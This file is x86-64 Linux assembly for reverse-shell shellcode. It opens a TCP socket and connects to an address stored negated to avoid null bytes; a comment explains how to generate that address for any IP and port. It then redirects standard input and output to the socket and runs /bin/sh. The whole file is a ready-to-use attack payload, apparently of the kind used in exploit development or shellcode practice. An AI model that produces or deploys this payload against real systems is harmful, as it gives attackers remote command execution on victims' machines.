; execute /bin/sh
; %rax	System call	    %rdi	                %rsi	                    %rdx	                    %r10	%r8	%r9
; 33	sys_dup2	    unsigned int oldfd	    unsigned int newfd
; 41	sys_socket	    int family	            int type	                int protocol
; 42	sys_connect	    int fd	                struct sockaddr *uservaddr	int addrlen
; 59	sys_execve	    const char *filename	const char *const argv[]	const char *const envp[]
; 60	sys_exit	    int error_code

%define SYS_DUP2 33
%define SYS_SOCKET 41
%define SYS_CONNECT 42
%define SYS_EXECVE 59
%define SYS_EXIT 60

; AF_INET = PF_INET
%define AF_INET 2
%define SOCK_STREAM 1
%define IPPROTO_TCP 6

%define SOCKET_FD 3



BITS 64
section .text
global _start
_start:

    push AF_INET              ; push 2 onto the stack (AF_INET)
    pop rdi                   ; move 2 to rdi

    push SOCK_STREAM          ; push 1 onto the stack (SOCK_STREAM)
    pop rsi                   ; move 1 to rsi

    push IPPROTO_TCP          ; push 6 onto the stack (IPPROTO_TCP)
    pop rdx                   ; move 6 to rdx

    push SYS_SOCKET  ; set sys_socket syscal number to rax
    pop rax
    syscall

    mov rdi, rax    ; save socket fd to rdi

    mov rsi, 0xfeffff80a3eefffe ; set our ip_addr struct to rsi (ex: python3 ip_struct_gen.py 127.0.0.1 4444 in order to generate the struct)
    neg rsi
    push rsi

    lea rsi, [rsp]

    push 16  ; set len of our struct to rdx
    pop rdx

    push SYS_CONNECT  ; set sys_connect syscal number to rax
    pop rax
    syscall

    push SOCKET_FD
    pop rsi
dup:
    push SYS_DUP2  ; set sys_dup2 syscal number to rax
    pop rax
    dec rsi        ; decrement rsi

    syscall
    jnz dup        ; jump if rax is 0

    
    push SYS_EXECVE  ; set sys_execve syscal number to rax
    pop rax
        
    xor rbx , rbx   ; set NULL to rbx
    push rbx        ; push rbx to stack

    mov rbx, 0x68732f6e69622f2f ; //bin/sh
    push rbx                    ; set //bin/sh to the stack

    mov rdi, rsp ; set //bin/sh to rdi
    xor rsi, rsi ; set NULL to rsi
    xor rdx, rdx ; set NULL to rdx
    syscall


    xor rdi, rdi  ; set 0 to rdi
    push SYS_EXIT  ; set sys_exit syscal number to rax
    pop rax
    syscall